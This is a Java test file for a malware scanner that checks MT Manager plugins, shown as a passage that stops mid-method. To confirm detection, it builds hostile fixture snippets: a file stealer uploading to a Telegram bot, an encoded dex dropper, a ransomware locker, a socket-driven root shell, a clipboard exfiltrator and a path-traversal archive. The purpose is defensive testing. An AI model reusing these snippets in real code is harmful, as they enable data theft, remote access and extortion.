package mtsafety.test;

import java.io.File;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

import mt.safety.scanner.core.Bytes;
import mt.safety.scanner.core.IocDatabase;
import mt.safety.scanner.core.Json;
import mt.safety.scanner.core.PluginScanner;
import mt.safety.scanner.core.ReportFormatter;
import mt.safety.scanner.core.ScanBudget;
import mt.safety.scanner.core.ScanReport;
import mt.safety.scanner.core.Verdict;

/**
 * The test suite.
 *
 * <p>No JUnit, deliberately: the detection engine has no dependencies, and neither do its tests, so the
 * whole thing builds and runs with nothing but a JDK. That matters for a security tool someone may want
 * to audit and rebuild themselves.
 *
 * <p>The suite checks both directions. Hostile fixtures must be caught, and benign ones must come back
 * clean: a scanner that flags everything is as useless as one that flags nothing, and the second half
 * of this file is what keeps the rules honest about that.
 */
public final class ScannerTest {

    private static int passed;
    private static final List<String> failures = new ArrayList<String>();

    public static void main(String[] args) throws Exception {
        File root = new File(System.getProperty("java.io.tmpdir"),
                "mtsafety-fixtures-" + System.currentTimeMillis());
        if (!root.mkdirs()) {
            throw new IllegalStateException("could not create " + root);
        }
        Fixtures fixtures = new Fixtures(root);

        jsonTests();
        bytesTests();
        lookalikeHelperTests();

        benignPlugins(fixtures);
        maliciousPlugins(fixtures);
        archiveAttacks(fixtures);
        manifestProblems(fixtures);
        trustDecisions(fixtures);
        reportRendering(fixtures);
        regressions(fixtures);
        realDeviceReport(fixtures);
        ActionsTest.run(new ActionsTest.Checker() {
            @Override
            public void that(String description, boolean condition, String context) {
                check(description, condition, context);
            }
        });

        System.out.println();
        System.out.println(passed + " checks passed, " + failures.size() + " failed");
        if (!failures.isEmpty()) {
            for (int i = 0; i < failures.size(); i++) {
                System.out.println("  FAILED: " + failures.get(i));
            }
            System.exit(1);
        }
        System.out.println("All good.");
    }

    // ------------------------------------------------------------- benign side

    private static void benignPlugins(Fixtures fixtures) {
        // A translation engine must reach the network to work at all. It should not be punished for it.
        String translator = ""
                + "package demo;\n"
                + "import bin.mt.plugin.api.translation.BaseTranslationEngine;\n"
                + "import java.net.HttpURLConnection;\n"
                + "import java.net.URL;\n"
                + "public class Engine extends BaseTranslationEngine {\n"
                + "  public String translate(String text) throws Exception {\n"
                + "    URL url = new URL(\"https://api.example-translate.com/v2/translate\");\n"
                + "    HttpURLConnection c = (HttpURLConnection) url.openConnection();\n"
                + "    c.setRequestMethod(\"POST\");\n"
                + "    return read(c);\n"
                + "  }\n"
                + "}\n";
        File dir = fixtures.directoryPlugin("benign-translator",
                Fixtures.manifest("demo.translator", "Demo Translator", "demo.Engine"),
                Fixtures.sources("src/demo/Engine.java", translator));
        ScanReport report = scan(dir);
        check("benign translator is not flagged",
                report.verdict() == Verdict.CLEAN || report.verdict() == Verdict.REVIEW,
                report.verdict() + " score=" + report.score() + " :: " + summarise(report));
        check("benign translator's network use is excused", report.hasRule("CTX001"),
                summarise(report));

        // A plain text utility touches nothing interesting at all.
        String util = ""
                + "package demo;\n"
                + "public class Case {\n"
                + "  public String toSnake(String input) {\n"
                + "    return input.replaceAll(\"([a-z])([A-Z])\", \"$1_$2\").toLowerCase();\n"
                + "  }\n"
                + "}\n";
        File utilDir = fixtures.directoryPlugin("benign-util",
                Fixtures.manifest("demo.case", "Case Converter", "demo.Case"),
                Fixtures.sources("src/demo/Case.java", util));
        ScanReport utilReport = scan(utilDir);
        check("benign utility is clean", utilReport.verdict() == Verdict.CLEAN,
                utilReport.verdict() + " score=" + utilReport.score() + " :: " + summarise(utilReport));

        // The same package as an .mtp archive must reach the same conclusion.
        File archive = fixtures.archivePlugin("benign-util.mtp",
                Fixtures.manifest("demo.case", "Case Converter", "demo.Case"),
                Fixtures.sources("src/demo/Case.java", util));
        ScanReport archiveReport = scan(archive);
        check("archive and directory agree", archiveReport.verdict() == utilReport.verdict(),
                archiveReport.verdict() + " vs " + utilReport.verdict());

        // A package wrapped in a folder is still an ordinary plugin, just rezipped.
        Map<String, byte[]> wrapped = new LinkedHashMap<String, byte[]>();
        wrapped.put("CaseConverter/manifest.json",
                Fixtures.bytes(Fixtures.manifest("demo.case", "Case Converter", "demo.Case")));
        wrapped.put("CaseConverter/src/demo/Case.java", Fixtures.bytes(util));
        ScanReport wrappedReport = scan(fixtures.rawArchive("wrapped.mtp", wrapped, false));
        check("wrapping folder is unwrapped, not treated as unknown content",
                "demo.case".equals(wrappedReport.manifest.pluginId) && wrappedReport.hasRule("ARC008")
                        && !wrappedReport.hasRule("ARC002"),
                wrappedReport.manifest.pluginId + " :: " + summarise(wrappedReport));
    }

    // ---------------------------------------------------------- hostile side

    private static void maliciousPlugins(Fixtures fixtures) {
        // Collection in one file, upload in another: the split a careful attacker uses.
        String collector = ""
                + "package x;\n"
                + "import java.io.File;\n"
                + "public class Collect {\n"
                + "  static final String[] TARGETS = {\n"
                + "    \"/data/data/com.whatsapp/databases\",\n"
                + "    \"/sdcard/wallet.dat\",\n"
                + "    \"/sdcard/.ssh/id_rsa\"\n"
                + "  };\n"
                + "  public File[] gather() { return new File(TARGETS[0]).listFiles(); }\n"
                + "}\n";
        String uploader = ""
                + "package x;\n"
                + "import java.net.HttpURLConnection;\n"
                + "import java.net.URL;\n"
                + "public class Send {\n"
                + "  public void send(byte[] body) throws Exception {\n"
                + "    URL url = new URL(\"https://api.telegram.org/bot123:ABC/sendDocument\");\n"
                + "    HttpURLConnection c = (HttpURLConnection) url.openConnection();\n"
                + "    c.setDoOutput(true);\n"
                + "    c.getOutputStream().write(body);\n"
                + "  }\n"
                + "}\n";
        ScanReport exfil = scan(fixtures.directoryPlugin("exfil",
                Fixtures.manifest("evil.exfil", "Handy Tools", "x.Collect"),
                Fixtures.sources("src/x/Collect.java", collector, "src/x/Send.java", uploader)));
        check("data theft across two files is caught",
                exfil.verdict() == Verdict.LIKELY_MALICIOUS && exfil.hasRule("CMB101"),
                exfil.verdict() + " score=" + exfil.score() + " :: " + summarise(exfil));
        check("the drop endpoint is named in the report", exfil.hasRule("NET003"), summarise(exfil));

        // A payload hidden in a string constant, decoded and loaded at runtime.
        String blob = Fixtures.base64(Fixtures.fakeDex(600));
        String dropper = ""
                + "package x;\n"
                + "import dalvik.system.DexClassLoader;\n"
                + "public class Loader {\n"
                + "  static final String P = \"" + blob + "\";\n"
                + "  public void go() throws Exception {\n"
                + "    byte[] raw = android.util.Base64.decode(P, 0);\n"
                + "    new DexClassLoader(write(raw), dir, null, getClass().getClassLoader());\n"
                + "  }\n"
                + "}\n";
        ScanReport dropperReport = scan(fixtures.directoryPlugin("dropper",
                Fixtures.manifest("evil.dropper", "Theme Pack", "x.Loader"),
                Fixtures.sources("src/x/Loader.java", dropper)));
        check("an encoded payload is decoded and recognised",
                dropperReport.verdict() == Verdict.LIKELY_MALICIOUS && dropperReport.hasRule("OBF005"),
                dropperReport.verdict() + " :: " + summarise(dropperReport));

        // Encryption plus bulk deletion plus a ransom note.
        String ransom = ""
                + "package x;\n"
                + "import javax.crypto.Cipher;\n"
                + "import javax.crypto.spec.SecretKeySpec;\n"
                + "public class Locker {\n"
                + "  static final String NOTE = \"All your files have been encrypted. \"\n"
                + "    + \"Send 0.05 BTC to recover the decryption key.\";\n"
                + "  public void run(java.io.File f) throws Exception {\n"
                + "    Cipher c = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n"
                + "    c.init(1, new SecretKeySpec(KEY, \"AES\"));\n"
                + "    deleteRecursive(f);\n"
                + "  }\n"
                + "}\n";
        ScanReport ransomReport = scan(fixtures.directoryPlugin("ransom",
                Fixtures.manifest("evil.locker", "File Optimizer", "x.Locker"),
                Fixtures.sources("src/x/Locker.java", ransom)));
        check("ransomware behaviour is caught",
                ransomReport.verdict() == Verdict.LIKELY_MALICIOUS && ransomReport.hasRule("DES002"),
                ransomReport.verdict() + " :: " + summarise(ransomReport));

        // Root commands driven from the network.
        String backdoor = ""
                + "package x;\n"
                + "public class Shell {\n"
                + "  public void exec(String cmd) throws Exception {\n"
                + "    Process p = Runtime.getRuntime().exec(new String[]{\"su\", \"-c\", cmd});\n"
                + "    java.net.Socket s = new java.net.Socket(\"185.23.44.10\", 4444);\n"
                + "    p.getOutputStream().write(s.getInputStream().read());\n"
                + "  }\n"
                + "}\n";
        ScanReport backdoorReport = scan(fixtures.directoryPlugin("backdoor",
                Fixtures.manifest("evil.shell", "Root Helper", "x.Shell"),
                Fixtures.sources("src/x/Shell.java", backdoor)));
        check("remote shell is caught",
                backdoorReport.verdict() == Verdict.LIKELY_MALICIOUS && backdoorReport.hasRule("CMB003"),
                backdoorReport.verdict() + " :: " + summarise(backdoorReport));
        check("the hardcoded address is reported", backdoorReport.hasRule("NET002"),
                summarise(backdoorReport));

        // Clipboard capture plus network: the pattern that steals recovery phrases.
        String spy = ""
                + "package x;\n"
                + "import android.content.ClipboardManager;\n"
                + "public class Watch {\n"
                + "  public void tick(ClipboardManager cm) throws Exception {\n"
                + "    CharSequence t = cm.getPrimaryClip().getItemAt(0).getText();\n"
                + "    new java.net.URL(\"https://webhook.site/abc\").openConnection();\n"
                + "  }\n"
                + "}\n";
        ScanReport spyReport = scan(fixtures.directoryPlugin("spy",
                Fixtures.manifest("evil.spy", "Clipboard Helper", "x.Watch"),
                Fixtures.sources("src/x/Watch.java", spy)));
        check("clipboard surveillance is caught",
                spyReport.verdict() == Verdict.LIKELY_MALICIOUS && spyReport.hasRule("CMB105"),
                spyReport.verdict() + " :: " + summarise(spyReport));

        // Reaching into MT Manager's own storage, where every other plugin lives.
        String crossPlugin = ""
                + "package x;\n"
                + "public class Reach {\n"
                + "  static final String P = \"/storage/emulated/0/Android/data/bin.mt.plus/files\";\n"
                + "  public void copyAll() throws Exception {\n"
                + "    new java.net.URL(\"http://203.0.113.9/collect\").openConnection();\n"
                + "  }\n"
                + "}\n";
        ScanReport crossReport = scan(fixtures.directoryPlugin("crossplugin",
                Fixtures.manifest("evil.reach", "Backup Helper", "x.Reach"),
                Fixtures.sources("src/x/Reach.java", crossPlugin)));
        check("reaching into MT Manager's own files is caught",
                crossReport.hasRule("XPL001") && crossReport.verdict().actionable(),
                crossReport.verdict() + " :: " + summarise(crossReport));
    }

    // -------------------------------------------------------- archive attacks

    private static void archiveAttacks(Fixtures fixtures) {
        String benign = "package demo;\npublic class A { public int n() { return 1; } }\n";

        // A member that unpacks outside the plugin folder.
        Map<String, byte[]> slip = new LinkedHashMap<String, byte[]>();
        slip.put("manifest.json", Fixtures.bytes(Fixtures.manifest("x.slip", "Slip", "demo.A")));
        slip.put("src/demo/A.java", Fixtures.bytes(benign));
        slip.put("../../../bin.mt.plus/files/patched.json", Fixtures.bytes("{}"));
        ScanReport slipReport = scan(fixtures.rawArchive("slip.mtp", slip, false));
        check("path traversal is critical",
                slipReport.hasRule("ARC001") && slipReport.verdict() == Verdict.LIKELY_MALICIOUS,
                slipReport.verdict() + " :: " + summarise(slipReport));

        // The same name twice, so the reviewed copy need not be the installed one.
        Map<String, byte[]> dupe = new LinkedHashMap<String, byte[]>();
        dupe.put("src/demo/A.java", Fixtures.bytes(benign));
        dupe.put("manifest.json", Fixtures.bytes(Fixtures.manifest("x.dupe", "Dupe", "demo.A")));
        ScanReport dupeReport = scan(fixtures.rawArchive("dupe.mtp", dupe, true));
        check("duplicate archive members are caught", dupeReport.hasRule("ARC005"),
                summarise(dupeReport));

        // A native library, which a Java-only plugin format has no use for.
        Map<String, byte[]> nativeLib = new LinkedHashMap<String, byte[]>();
        nativeLib.put("manifest.json", Fixtures.bytes(Fixtures.manifest("x.native", "Native", "demo.A")));
        nativeLib.put("src/demo/A.java", Fixtures.bytes(benign));
        nativeLib.put("libs/libhelper.so", Fixtures.bytes("\u007fELF fake native payload"));
        ScanReport nativeReport = scan(fixtures.rawArchive("native.mtp", nativeLib, false));
        check("a bundled native library is reported", nativeReport.hasRule("ARC003"),
                summarise(nativeReport));

        // A payload renamed to look like an image.
        Map<String, byte[]> disguised = new LinkedHashMap<String, byte[]>();
        disguised.put("manifest.json", Fixtures.bytes(Fixtures.manifest("x.disg", "Disguised", "demo.A")));
        disguised.put("src/demo/A.java", Fixtures.bytes(benign));
        disguised.put("assets/banner.dat", Fixtures.fakeDex(4096));
        ScanReport disguisedReport = scan(fixtures.rawArchive("disguised.mtp", disguised, false));
        check("contents are judged, not file extensions", disguisedReport.hasRule("ARC003"),
                summarise(disguisedReport));

        // A large, near-random asset: encrypted or packed rather than data.
        Map<String, byte[]> packed = new LinkedHashMap<String, byte[]>();
        packed.put("manifest.json", Fixtures.bytes(Fixtures.manifest("x.packed", "Packed", "demo.A")));
        packed.put("src/demo/A.java", Fixtures.bytes(benign));
        packed.put("assets/data.bin", Fixtures.highEntropy(96 * 1024));
        ScanReport packedReport = scan(fixtures.rawArchive("packed.mtp", packed, false));
        check("a packed payload is reported", packedReport.hasRule("ARC007"), summarise(packedReport));
    }

    // ------------------------------------------------------ manifest problems

    private static void manifestProblems(Fixtures fixtures) {
        Map<String, byte[]> noManifest = new LinkedHashMap<String, byte[]>();
        noManifest.put("src/demo/A.java", Fixtures.bytes("package demo;\npublic class A {}\n"));
        ScanReport missing = scan(fixtures.rawArchive("nomanifest.mtp", noManifest, false));
        check("a package with no manifest is reported",
                missing.hasRule("MFT001") && missing.verdict() != Verdict.CLEAN,
                missing.verdict() + " :: " + summarise(missing));

        File broken = fixtures.directoryPlugin("brokenmanifest", "{ this is not json",
                Fixtures.sources("src/demo/A.java", "package demo;\npublic class A {}\n"));
        ScanReport brokenReport = scan(broken);
        check("an unparsable manifest is reported", brokenReport.hasRule("MFT002"),
                summarise(brokenReport));

        // A name whose displayed form differs from its real one.
        String sneaky = Fixtures.manifest("x.sneaky", "Safe\u202ePlugin", "demo.A");
        ScanReport sneakyReport = scan(fixtures.directoryPlugin("sneaky", sneaky,
                Fixtures.sources("src/demo/A.java", "package demo;\npublic class A {}\n")));
        check("invisible characters in metadata are reported", sneakyReport.hasRule("MFT009"),
                summarise(sneakyReport));

        // An entry point that is not in the package.
        String ghost = Fixtures.manifest("x.ghost", "Ghost", "demo.NotHere");
        ScanReport ghostReport = scan(fixtures.directoryPlugin("ghost", ghost,
                Fixtures.sources("src/demo/A.java", "package demo;\npublic class A {}\n")));
        check("a missing declared entry point is reported", ghostReport.hasRule("MFT006"),
                summarise(ghostReport));

        // Two installed plugins with near-identical identities.
        String body = "package demo;\npublic class A {}\n";
        File original = fixtures.directoryPlugin("lookalike-a",
                Fixtures.manifest("com.example.tools", "Example Tools", "demo.A"),
                Fixtures.sources("src/demo/A.java", body));
        File imposter = fixtures.directoryPlugin("lookalike-b",
                Fixtures.manifest("com.exampie.tools", "Example Tools", "demo.A"),
                Fixtures.sources("src/demo/A.java", body));
        PluginScanner scanner = new PluginScanner(IocDatabase.empty());
        List<File> both = new ArrayList<File>();
        both.add(original);
        both.add(imposter);
        List<ScanReport> reports = scanner.scanAll(both, ScanBudget.unlimited());
        check("near-identical plugin identities are flagged on both",
                reports.get(0).hasRule("MFT011") && reports.get(1).hasRule("MFT011"),
                summarise(reports.get(0)) + " / " + summarise(reports.get(1)));
    }

    // --------------------------------------------------------- trust handling

    private static void trustDecisions(Fixtures fixtures) {
        // Risky enough to be flagged, but nothing critical, so a trust decision can stand.
        String noisy = ""
                + "package demo;\n"
                + "public class N {\n"
                + "  public void f() throws Exception {\n"
                + "    Runtime.getRuntime().exec(\"ls\");\n"
                + "  }\n"
                + "}\n";
        File dir = fixtures.directoryPlugin("trusted-plugin",
                Fixtures.manifest("demo.noisy", "Noisy", "demo.N"),
                Fixtures.sources("src/demo/N.java", noisy));

        ScanReport before = scan(dir);
        check("a risky plugin is flagged before being trusted", before.verdict().actionable(),
                before.verdict() + " :: " + summarise(before));

        // Trusting a hash silences it, which is the point of the list.
        IocDatabase trusting = IocDatabase.empty();
        trusting.trust(before.contentHash, "reviewed by hand");
        ScanReport afterTrust = new PluginScanner(trusting).scan(dir, ScanBudget.unlimited());
        check("a trusted hash changes the verdict", afterTrust.verdict() == Verdict.TRUSTED,
                afterTrust.verdict() + " :: " + summarise(afterTrust));

        // Trust must not survive a change to the package.
        Fixtures.bytes("");
        File changed = fixtures.directoryPlugin("trusted-plugin-changed",
                Fixtures.manifest("demo.noisy", "Noisy", "demo.N"),
                Fixtures.sources("src/demo/N.java", noisy + "// one more line\n"));
        ScanReport changedReport = new PluginScanner(trusting).scan(changed, ScanBudget.unlimited());
        check("trust does not carry over to a modified package",
                changedReport.verdict() != Verdict.TRUSTED,
                changedReport.verdict() + " :: " + summarise(changedReport));

        // Trust is a judgement about risk, not a silencer: critical findings still get through.
        String critical = ""
                + "package demo;\n"
                + "public class C {\n"
                + "  static final String P = \"/data/data/com.whatsapp/databases\";\n"
                + "  public void f() throws Exception {\n"
                + "    new java.net.URL(\"https://webhook.site/x\").openConnection();\n"
                + "  }\n"
                + "}\n";
        File criticalDir = fixtures.directoryPlugin("trusted-but-critical",
                Fixtures.manifest("demo.critical", "Critical", "demo.C"),
                Fixtures.sources("src/demo/C.java", critical));
        ScanReport criticalBefore = scan(criticalDir);
        IocDatabase trustingCritical = IocDatabase.empty();
        trustingCritical.trust(criticalBefore.contentHash, "trusted by mistake");
        ScanReport criticalAfter = new PluginScanner(trustingCritical)
                .scan(criticalDir, ScanBudget.unlimited());
        check("trust does not silence a critical finding",
                criticalAfter.verdict() == Verdict.LIKELY_MALICIOUS,
                criticalAfter.verdict() + " :: " + summarise(criticalAfter));

        IocDatabase denying = IocDatabase.empty();
        denying.deny("demo.noisy", "reported by a friend");
        ScanReport denied = new PluginScanner(denying).scan(dir, ScanBudget.unlimited());
        check("a denylisted plugin id is reported as known bad",
                denied.verdict() == Verdict.KNOWN_BAD, denied.verdict() + " :: " + summarise(denied));

        // A user-supplied pattern is honoured.
        IocDatabase custom = IocDatabase.parse("{\"trusted\":[],\"denied\":[],"
                + "\"patterns\":[\"example-translate\\\\.com\"]}");
        String usesEndpoint = "package demo;\npublic class E {"
                + " String u = \"https://api.example-translate.com/v2\"; }\n";
        File endpointDir = fixtures.directoryPlugin("custom-pattern",
                Fixtures.manifest("demo.custom", "Custom", "demo.E"),
                Fixtures.sources("src/demo/E.java", usesEndpoint));
        ScanReport customReport = new PluginScanner(custom).scan(endpointDir, ScanBudget.unlimited());
        check("a pattern from the user's own list fires", customReport.hasRule("USR001"),
                summarise(customReport));

        // Round-tripping the database must not lose entries.
        IocDatabase reloaded = IocDatabase.parse(trusting.toJson());
        check("the indicator file round-trips", reloaded.isTrusted(before.contentHash),
                "trusted=" + reloaded.trustedCount());
    }

    // ------------------------------------------------------------- rendering

    private static void reportRendering(Fixtures fixtures) {
        File dir = fixtures.directoryPlugin("render",
                Fixtures.manifest("demo.render", "Render", "demo.A"),
                Fixtures.sources("src/demo/A.java",
                        "package demo;\npublic class A { String u=\"https://api.telegram.org/bot1/x\"; }\n"));
        ScanReport report = scan(dir);

        String text = ReportFormatter.plainText(report);
        check("the text report names the verdict and the rule",
                text.contains("Verdict") && text.contains("NET003"), text.substring(0, Math.min(120, text.length())));

        List<ScanReport> one = new ArrayList<ScanReport>();
        one.add(report);
        String json = ReportFormatter.json(one);
        check("the JSON report parses", parses(json), json.substring(0, Math.min(160, json.length())));

        // A tight budget must degrade into a truncated report, not a crash or a false all-clear.
        ScanReport starved = new PluginScanner(IocDatabase.empty()).scan(dir, new ScanBudget(0L, 0L));
        check("an exhausted budget is reported honestly",
                starved.truncated() && starved.hasRule("SCN001"), summarise(starved));
    }


    // ------------------------------------------------------------- regressions

    /**
     * Cases that were once wrong.
     *
     * <p>Each of these is a defect found by review after the scanner was first written. They are kept
     * as tests rather than just fixed, because a scanner that silently stops catching something is
     * worse than one that never caught it: the report still looks reassuring.
     */
    /**
     * The scan of a real device rated all 31 installed plugins, MT Manager's own included, as
     * suspicious or worse. Installed plugins are v3: a folder holding {@code plugin.mtp} whose code is
     * a {@code classes.dex}, a {@code {key}} name resolved from an {@code .mtl}, an {@code icon.webp},
     * and assets that mention API names in passing. These pin the behaviour that report demanded.
     */
    private static void realDeviceReport(Fixtures fixtures) {
        String benign = "package demo;\npublic class A { public int n() { return 1; } }\n";

        // A v3 translator: dexMode, a placeholder name, its engine and preference declared and present
        // in the dex string table, an icon.webp, and a strings.mtl that names it.
        java.util.Map<String, byte[]> members = new java.util.LinkedHashMap<String, byte[]>();
        members.put("manifest.json", Fixtures.bytes(
                "{\"pluginSdkVersion\": 3, \"dexMode\": true, \"pluginID\": \"bin.plugin.translator.google\","
                        + " \"versionCode\": 1, \"versionName\": \"v1.5\", \"name\": \"{name}\","
                        + " \"description\": \"{description}\","
                        + " \"mainPreference\": \"bin.mt.plugin.GoogleTranslatePreference\","
                        + " \"interfaces\": [\"bin.mt.plugin.GoogleWebTranslationEngine\"]}"));
        members.put("classes.dex", Fixtures.dexWithStrings(
                "Lbin/mt/plugin/GoogleWebTranslationEngine;",
                "Lbin/mt/plugin/GoogleTranslatePreference;",
                "Lbin/mt/plugin/api/translation/TranslationEngine;"));
        members.put("icon.webp", Fixtures.bytes("RIFF____WEBPVP8 realish-image-bytes"));
        members.put("assets/strings.mtl",
                Fixtures.bytes("name: Google Translate\ndescription: Translates text via Google.\n"));
        File translator = fixtures.installedArchive("bin.plugin.translator.google", members, null);
        ScanReport translatorReport = new PluginScanner(IocDatabase.empty())
                .scan(translator, ScanBudget.unlimited());
        check("a real v3 translator is clean, not suspicious",
                translatorReport.verdict() == Verdict.CLEAN, summarise(translatorReport)
                        + " :: " + translatorReport.verdict());
        check("its declared classes are found in the dex, so MFT006 does not fire",
                !translatorReport.hasRule("MFT006"), summarise(translatorReport));
        check("a {key} name is resolved from the language file, not shown raw",
                "Google Translate".equals(translatorReport.manifest.displayName()),
                translatorReport.manifest.displayName());
        check("hardcoding a class under bin.mt.plugin is not treated as reaching into MT",
                !translatorReport.hasRule("XPL001"), summarise(translatorReport));
        check("the translation-engine trait is recognised from the dex",
                translatorReport.traits.contains("translation-engine"),
                String.valueOf(translatorReport.traits));
        check("a v3 installed plugin is marked installed, so the UI can act on it",
                translatorReport.installed, "installed=" + translatorReport.installed);

        // A Markdown previewer bundling commonmark and highlight.js: the assets name chmod, chown and
        // package-archive, and used to score it "likely malicious" for words in a keyword table.
        java.util.Map<String, byte[]> md = new java.util.LinkedHashMap<String, byte[]>();
        md.put("manifest.json", Fixtures.bytes(
                "{\"pluginSdkVersion\": 3, \"dexMode\": true, \"pluginID\": \"com.md.preview\","
                        + " \"versionCode\": 1, \"versionName\": \"1.0.0\", \"name\": \"Markdown Preview\","
                        + " \"description\": \"Preview markdown\","
                        + " \"mainPreference\": \"com.md.preview.FontSettings\","
                        + " \"interfaces\": [\"com.md.preview.MarkdownPreviewToolMenu\"]}"));
        md.put("classes.dex", Fixtures.dexWithStrings(
                "Lcom/md/preview/FontSettings;", "Lcom/md/preview/MarkdownPreviewToolMenu;"));
        md.put("assets/highlight/highlight.min.js",
                Fixtures.bytes("chdir chmod chomp chop chown chr chroot close closedir connect continue"));
        md.put("assets/katex/katex.min.js",
                Fixtures.bytes("document.createElementNS(\"http://www.w3.org/2000/svg\",\"svg\");"));
        md.put("org/commonmark/internal/util/entities.properties", Fixtures.bytes("nbsp=160\namp=38\n"));
        File preview = fixtures.installedArchive("com.md.preview", md, null);
        ScanReport previewReport = new PluginScanner(IocDatabase.empty())
                .scan(preview, ScanBudget.unlimited());
        check("a markdown previewer is not called malicious for a syntax-highlighter word list",
                previewReport.verdict() == Verdict.CLEAN || previewReport.verdict() == Verdict.REVIEW,
                summarise(previewReport) + " :: " + previewReport.verdict());
        check("shell words in a data file do not trip the command-execution rules",
                !previewReport.hasRule("EXE004") && !previewReport.hasRule("CMB103"),
                summarise(previewReport));
        check("an XMP or SVG namespace URL in an asset is not a plain-HTTP finding",
                !previewReport.hasRule("NET005"), summarise(previewReport));

        // MT Manager keeps a v3 plugin's dex beside the package, not inside it: the manifest declares
        // classes the scan cannot see, and that absence is MT Manager's layout, not the plugin's.
        java.util.Map<String, byte[]> extracted = new java.util.LinkedHashMap<String, byte[]>();
        extracted.put("manifest.json", Fixtures.bytes(
                "{\"pluginSdkVersion\": 3, \"dexMode\": true, \"pluginID\": \"com.ext.tool\","
                        + " \"versionCode\": 1, \"versionName\": \"v1\", \"name\": \"Extracted\","
                        + " \"description\": \"d\", \"mainPreference\": \"com.ext.tool.Pref\","
                        + " \"interfaces\": [\"com.ext.tool.Menu\"]}"));
        extracted.put("assets/strings.mtl", Fixtures.bytes("k: v\n"));
        java.util.Map<String, byte[]> beside = new java.util.LinkedHashMap<String, byte[]>();
        beside.put("classes.dex", Fixtures.dexWithStrings("Lcom/ext/tool/Pref;", "Lcom/ext/tool/Menu;"));
        File extractedPlugin = fixtures.installedArchive("com.ext.tool", extracted, beside);
        ScanReport extractedReport = new PluginScanner(IocDatabase.empty())
                .scan(extractedPlugin, ScanBudget.unlimited());
        check("a v3 plugin whose dex MT Manager extracted beside it is not accused of missing classes",
                !extractedReport.hasRule("MFT006"), summarise(extractedReport));

        // A manifest MT Manager accepts but strict JSON rejects: a comment and a trailing comma.
        java.util.Map<String, byte[]> lenient = new java.util.LinkedHashMap<String, byte[]>();
        lenient.put("manifest.json", Fixtures.bytes(
                "{\n  // the main translation entry\n  \"pluginSdkVersion\": 3, \"dexMode\": true,\n"
                        + "  \"pluginID\": \"io.lenient.tool\", \"versionCode\": 1, \"versionName\": \"v1\",\n"
                        + "  \"name\": \"Lenient\", \"description\": \"d\",\n"
                        + "  \"interfaces\": [\"io.lenient.tool.Engine\",],\n}"));
        lenient.put("classes.dex", Fixtures.dexWithStrings("Lio/lenient/tool/Engine;"));
        File lenientPlugin = fixtures.installedArchive("io.lenient.tool", lenient, null);
        ScanReport lenientReport = new PluginScanner(IocDatabase.empty())
                .scan(lenientPlugin, ScanBudget.unlimited());
        check("a manifest with comments MT Manager accepts is read, not called invalid JSON",
                "io.lenient.tool".equals(lenientReport.manifest.pluginId),
                lenientReport.manifest.pluginId + " / " + summarise(lenientReport));
        check("but the non-standard JSON is noted at low severity",
                lenientReport.manifest.nonStandardJson && lenientReport.verdict() != Verdict.LIKELY_MALICIOUS,
                summarise(lenientReport) + " :: " + lenientReport.verdict());

        // The whole point still holds: a v3 package whose dex really does name su, a bot endpoint and
        // /data/data is caught, because the dex strings are searched like any other code.
        java.util.Map<String, byte[]> evil = new java.util.LinkedHashMap<String, byte[]>();
        evil.put("manifest.json", Fixtures.bytes(
                "{\"pluginSdkVersion\": 3, \"dexMode\": true, \"pluginID\": \"evil.v3\","
                        + " \"versionCode\": 1, \"versionName\": \"v1\", \"name\": \"Helper\","
                        + " \"description\": \"d\", \"interfaces\": []}"));
        evil.put("classes.dex", Fixtures.dexWithStrings(
                "su -c https://api.telegram.org/bot9:AA/sendDocument",
                "/data/data/com.whatsapp/databases",
                "Ljava/lang/Runtime;", "Ljava/net/Socket;"));
        File evilPlugin = fixtures.installedArchive("evil.v3", evil, null);
        ScanReport evilReport = new PluginScanner(IocDatabase.empty())
                .scan(evilPlugin, ScanBudget.unlimited());
        check("a v3 package whose dex hides a real payload is still caught",
                evilReport.verdict() == Verdict.LIKELY_MALICIOUS, summarise(evilReport)
                        + " :: " + evilReport.verdict());
        check("the payload's capabilities are read out of the dex string table",
                evilReport.hasRule("SEN001") && evilReport.hasRule("NET003") && evilReport.hasRule("EXE001"),
                summarise(evilReport));

        // The second device report: 22 clean, but eight plugins sat at "worth a look" for reasons
        // that were all MT Manager's own doing rather than the plugin's. Each is pinned here.

        // Six of the eight: an installed package MT Manager compiled, keeping the result beside it.
        // The manifest still declares its classes and the package no longer contains them.
        java.util.Map<String, byte[]> hostKept = new java.util.LinkedHashMap<String, byte[]>();
        hostKept.put("manifest.json", Fixtures.bytes(
                "{\"pluginSdkVersion\": 2, \"pluginID\": \"com.hand.mtplugin\", \"versionCode\": 1,"
                        + " \"versionName\": \"v1.0\", \"name\": \"Unicode\", \"description\": \"d\","
                        + " \"mainPreference\": \"com.hand.mtplugin.Preference\","
                        + " \"interfaces\": [\"com.hand.mtplugin.UnicodeTranslationEngine\"]}"));
        hostKept.put("assets/strings.mtl", Fixtures.bytes("k: v\n"));
        java.util.Map<String, byte[]> compiledBeside = new java.util.LinkedHashMap<String, byte[]>();
        compiledBeside.put("code", Fixtures.highEntropy(190 * 1024));
        File hostKeptPlugin = fixtures.installedArchive("com.hand.mtplugin", hostKept, compiledBeside);
        ScanReport hostKeptReport = new PluginScanner(IocDatabase.empty())
                .scan(hostKeptPlugin, ScanBudget.unlimited());
        check("a plugin whose code MT Manager keeps beside the package is clean, not worth a look",
                hostKeptReport.verdict() == Verdict.CLEAN,
                hostKeptReport.verdict() + " :: " + summarise(hostKeptReport));
        check("its declared classes are not reported as missing",
                !hostKeptReport.hasRule("MFT006"), summarise(hostKeptReport));
        check("and MT Manager's own encrypted output is not called a packed member",
                !hostKeptReport.hasRule("ARC007"), summarise(hostKeptReport));

        // A loose download that declares classes and ships no code at all is still reported: there
        // the absence is the package's own, not the host's.
        java.util.Map<String, byte[]> hollow = new java.util.LinkedHashMap<String, byte[]>();
        hollow.put("manifest.json", Fixtures.bytes(
                "{\"pluginSdkVersion\": 2, \"pluginID\": \"x.hollow\", \"versionCode\": 1,"
                        + " \"versionName\": \"v1\", \"name\": \"Hollow\", \"description\": \"d\","
                        + " \"interfaces\": [\"x.hollow.Engine\"]}"));
        hollow.put("assets/note.txt", Fixtures.bytes("nothing here"));
        ScanReport hollowReport = scan(fixtures.rawArchive("hollow.mtp", hollow, false));
        check("a download that declares a class and ships no code is still reported",
                hollowReport.hasRule("MFT006"), summarise(hollowReport));

        // JavaSmali declares pluginSdkVersion 1, which is a real MT generation, not an unknown one.
